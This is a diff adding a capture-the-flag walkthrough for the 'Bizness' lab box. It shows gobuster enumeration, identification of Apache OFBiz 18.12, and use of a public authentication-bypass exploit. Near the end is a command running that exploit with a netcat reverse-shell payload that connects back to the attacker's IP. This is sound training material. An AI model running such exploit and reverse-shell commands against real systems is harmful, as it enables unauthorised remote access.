@@ -45,5 +45,43 @@ Looks like a web server is running, not sure what 44699 is though.  I do see a h
 As a certificate isn't too common for CTFs, I tried navigating to the IP and via plain HTTP, though both redirected to the https site.
 The certificate itself also does not contain any additional information that would be useful, like subdomains, etc.  It's possible there may be something else, but nothing obvious as far as I can tell.
 
+Basic fingerprinting of the site through specific extensions such as .html, .php show that the site appears to be a vanilla server running some form of html/css/js as https://bizness.htb/index.html resolves, but https://bizness.htb/index.php redirects to https://bizness.htb.
+With the above information, we can craft a gobuster command to scan the site for pages: gobuster dir -u https://bizness.htb/ -k -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html -b 302
+(the -k and -b 302 is needed for this box)
+
+While that runs, I can continue looking through the site.  There is an email leaked in their contact page: info@bizness.htb.  The email form at the bottom has the submit button disabled, though this is just an html attribute so we can edit this from the client-side.  Altering this does allow the button to work, though I'm not sure this is the way forward (as it often isnt), but it's worth noting if other avenues dry up.
+
+Gobuster scans resulted in a few pages being found:
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     https://bizness.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   302
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 27200]
+/default.html         (Status: 404) [Size: 763]
+/select               (Status: 404) [Size: 757]
+/control              (Status: 200) [Size: 34633]
+
+Navigating to the /select page presents a generic 404 error.  This leaks that the server is running Apache Tomcat/9.0.82, but otherwise nothing of note that I see.  This version was released on 2023-10-13
+
+the /control page is an error message saying "org.apache.ofbiz.webapp.control.RequestHandlerException: Unknown request [null]; this request does not exist or cannot be called directly" and looks to be generated from Apache OFBiz
+
+I looked up exploits for the Apache OFBiz system and found a few github repos detailing an exploit, however none appeared to detect the application as vulnerable.  Despite this I did follow the exploit path and found this page:
+https://bizness.htb/webtools/control/main  --> however attempting to login as the admin user presents an error that the account is locked...  This page does mention that the release is 18.12, and I was able to locate an exploit:
+https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master
+
+Using this script (the one above), we can get a shell with the below:
+python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.29 9001 0>&1'
+
+This gives us the user flag.
 
 
